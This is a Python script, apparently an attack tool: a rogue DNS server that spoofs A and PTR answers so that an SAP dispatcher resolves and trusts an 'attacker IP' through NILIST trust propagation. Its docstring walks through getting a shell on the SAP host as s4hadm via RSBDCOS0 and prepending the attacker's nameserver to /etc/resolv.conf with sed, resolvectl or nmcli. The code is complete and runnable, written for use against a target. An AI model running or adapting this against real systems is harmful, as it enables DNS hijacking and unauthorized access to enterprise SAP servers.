#!/usr/bin/env python3
"""
nilist_dns_server.py — Minimal forwarding DNS server to fix NILIST trust propagation.

The SAP dispatcher does getnameinfo(192.168.2.210) → 'host.example.com'
then tries getaddrinfo('host.example.com') → NXDOMAIN → never connects.

This server:
  - Answers A  host.example.com  → 192.168.2.210
  - Forwards all other queries to real upstream DNS servers

Run as root on 192.168.2.210:
  sudo python3 nilist_dns_server.py

Then on the SAP server (via RSBDCOS0 / shell as s4hadm), prepend our IP to
/etc/resolv.conf so the dispatcher's DNS lookups hit us first:

  # Check current resolv.conf:
  cat /etc/resolv.conf

  # If writable (unlikely as s4hadm), prepend:
  sed -i '1s/^/nameserver 192.168.2.210\\n/' /etc/resolv.conf

  # If resolv.conf is a symlink to a writable location:
  ls -la /etc/resolv.conf

  # Alternative: use resolvectl (may work without root on some systems):
  resolvectl dns <interface> 192.168.2.210

  # Alternative: use nmcli:
  nmcli con mod <con-name> ipv4.dns '192.168.2.210' && nmcli con up <con-name>
"""

import socket
import struct
import argparse
import sys
import select


# Hostname the SAP dispatcher reverse-resolves our IP to.
# Override via --hostname if different on your system.
REVERSE_HOSTNAME = "host.example.com"
ATTACKER_IP      = "192.168.2.210"

# Upstream DNS for forwarding non-matched queries
UPSTREAM_DNS = [
    ("8.8.8.8", 53),
    ("1.1.1.1", 53),
]


def _encode_name(name: str) -> bytes:
    parts = name.rstrip(".").split(".")
    enc = b""
    for p in parts:
        lb = p.encode("ascii")
        enc += bytes([len(lb)]) + lb
    return enc + b"\x00"


def _decode_name(data: bytes, offset: int) -> tuple:
    labels = []
    jumped = False
    orig_offset = offset
    for _ in range(50):
        if offset >= len(data):
            break
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            if offset + 1 >= len(data):
                break
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            if not jumped:
                orig_offset = offset + 2
            jumped = True
            offset = ptr
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length
    if jumped:
        return ".".join(labels), orig_offset
    return ".".join(labels), offset


def _build_a_response(query: bytes, ip: str) -> bytes:
    """Build an A-record DNS response."""
    if len(query) < 12:
        return b""
    txid = query[:2]
    # Find end of question section
    off = 12
    try:
        _, off = _decode_name(query, 12)
        off += 4   # skip QTYPE + QCLASS
    except Exception:
        return b""
    question = query[12:off]

    try:
        ip_bytes = socket.inet_aton(ip)
    except socket.error:
        return b""

    header  = txid
    header += struct.pack("!H", 0x8400)    # QR=1 AA=1 RCODE=0
    header += struct.pack("!HHHH", 1, 1, 0, 0)  # QDCOUNT=1 ANCOUNT=1 NS=0 AR=0
    answer  = b"\xc0\x0c"                 # pointer to question name at offset 12
    answer += struct.pack("!HHI", 1, 1, 60)       # TYPE=A CLASS=IN TTL=60
    answer += struct.pack("!H", 4) + ip_bytes
    return header + question + answer


def _build_ptr_response(query: bytes, hostname: str) -> bytes:
    """Build a PTR-record DNS response."""
    if len(query) < 12:
        return b""
    txid = query[:2]
    off = 12
    try:
        _, off = _decode_name(query, 12)
        off += 4
    except Exception:
        return b""
    question = query[12:off]
    hostname_enc = _encode_name(hostname)

    header  = txid
    header += struct.pack("!H", 0x8400)
    header += struct.pack("!HHHH", 1, 1, 0, 0)
    answer  = b"\xc0\x0c"
    answer += struct.pack("!HHI", 12, 1, 60)      # TYPE=PTR
    answer += struct.pack("!H", len(hostname_enc)) + hostname_enc
    return header + question + answer


def _forward_query(query: bytes, upstreams: list) -> bytes:
    """Forward a DNS query to upstream servers and return the response."""
    for upstream_ip, upstream_port in upstreams:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2.0)
            s.sendto(query, (upstream_ip, upstream_port))
            resp, _ = s.recvfrom(4096)
            s.close()
            return resp
        except Exception:
            pass
    return b""


def run_dns_server(bind_ip: str = "0.0.0.0", port: int = 53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((bind_ip, port))
    except PermissionError:
        print(f"[!] Cannot bind port {port} — run as root, or use --port 5353")
        sys.exit(1)
    except OSError as e:
        print(f"[!] Bind failed: {e}")
        sys.exit(1)

    print(f"[*] DNS server on {bind_ip}:{port}")
    print(f"[*] A   {REVERSE_HOSTNAME} → {ATTACKER_IP}  (our override)")
    print(f"[*] PTR 210.2.168.192.in-addr.arpa → {REVERSE_HOSTNAME}")
    print(f"[*] All other queries forwarded to {UPSTREAM_DNS}")
    print()
    print(f"To use: add 'nameserver {ATTACKER_IP}' as the FIRST line in the")
    print(f"SAP server's /etc/resolv.conf (requires root on SAP server).")
    print()

    while True:
        try:
            ready, _, _ = select.select([sock], [], [], 1.0)
            if not ready:
                continue
            data, addr = sock.recvfrom(512)
        except KeyboardInterrupt:
            print("\n[*] DNS server stopped.")
            break
        except OSError:
            break

        if len(data) < 12:
            continue

        try:
            qname, off = _decode_name(data, 12)
            qtype  = struct.unpack("!H", data[off:off+2])[0]
            qt_str = {1: "A", 12: "PTR", 28: "AAAA"}.get(qtype, str(qtype))
        except Exception:
            continue

        qname_lower = qname.lower()
        our_host    = REVERSE_HOSTNAME.lower()
        our_ptr     = ".".join(reversed(ATTACKER_IP.split("."))) + ".in-addr.arpa"

        if qname_lower == our_host and qtype == 1:
            resp = _build_a_response(data, ATTACKER_IP)
            print(f"[DNS] {addr[0]} A {qname} → {ATTACKER_IP} [override]")
        elif qname_lower == our_ptr and qtype == 12:
            resp = _build_ptr_response(data, REVERSE_HOSTNAME)
            print(f"[DNS] {addr[0]} PTR {qname} → {REVERSE_HOSTNAME} [override]")
        else:
            resp = _forward_query(data, UPSTREAM_DNS)
            status = "forwarded" if resp else "FAILED"
            print(f"[DNS] {addr[0]} {qt_str} {qname} [{status}]")

        if resp:
            sock.sendto(resp, addr)


def main():
    parser = argparse.ArgumentParser(
        description="Forwarding DNS server — resolves the reverse-hostname for the attacker IP")
    parser.add_argument("--bind",     default="0.0.0.0")
    parser.add_argument("--port",     type=int, default=53)
    parser.add_argument("--hostname", default=None,
                        help="Reverse-DNS hostname of the attacker IP to override")
    parser.add_argument("--ip",       default=None,
                        help="Attacker IP (the one that needs to be trusted)")
    parser.add_argument("--upstream", default="8.8.8.8",
                        help="Upstream DNS IP for forwarding (default: 8.8.8.8)")
    args = parser.parse_args()

    global REVERSE_HOSTNAME, ATTACKER_IP, UPSTREAM_DNS
    if args.hostname:
        REVERSE_HOSTNAME = args.hostname
    if args.ip:
        ATTACKER_IP = args.ip
    UPSTREAM_DNS = [(args.upstream, 53), ("1.1.1.1", 53)]

    run_dns_server(args.bind, args.port)


if __name__ == "__main__":
    main()
